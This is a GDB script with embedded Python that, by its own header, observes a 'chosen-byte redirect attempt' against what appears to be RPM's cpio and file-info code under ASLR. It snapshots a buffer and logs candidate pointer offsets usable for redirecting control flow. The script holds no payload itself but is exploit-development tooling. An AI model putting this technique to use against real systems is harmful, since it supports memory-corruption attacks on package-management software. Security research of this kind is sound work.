# ASLR-on observer for the chosen-byte redirect attempt: GDB only observes.
set pagination off
set breakpoint pending on
set confirm off
break main
run
python
import struct
MASK = (1 << 64) - 1
snaps = {}
visits = []
seen = []
class EntryBP(gdb.Breakpoint):
    def stop(self):
        b = int(gdb.parse_and_eval("buf")) & MASK
        try:
            raw = gdb.selected_inferior().read_memory(b, 0x1000)
            snaps[b] = struct.unpack("<512Q", bytes(raw))
        except gdb.error as exc:
            gdb.write("SNAP_FAIL=%s %s\n" % (hex(b), exc))
        return False
class VisitBP(gdb.Breakpoint):
    def stop(self):
        visits.append(int(gdb.parse_and_eval("$r14")) & MASK)
        return False
EntryBP("rpmcpioRead")
VisitBP("*(&lua_resume + 0x206)")
def report():
    if not seen:
        return
    base = seen[0]
    vals = snaps.get(base)
    gdb.write("WINDOW_BUF=%s\n" % hex(base))
    offsets = sorted({v - base for v in visits if base <= v < base + 0x1000})
    gdb.write("OFFSETS=%s\n" % ','.join(hex(o) for o in offsets))
    for off in offsets:
        v = vals[off // 8] if vals else None
        if v is not None and base < v < base + 0x1000:
            delta = v - base
            if 0 < delta < off and (delta & ~0xff) + 0x10 <= off:
                gdb.write("CAND off=%#x pre=%s delta=%#x\n" % (off, hex(v), delta))
    gdb.write("WINDOW_REPORT_DONE=1\n")
class CopyBP(gdb.Breakpoint):
    def stop(self):
        seen.append(int(gdb.parse_and_eval("buf")) & MASK)
        return False
CopyBP("rpmfi.cc:2243")
gdb.events.exited.connect(lambda ev: report())
end
continue
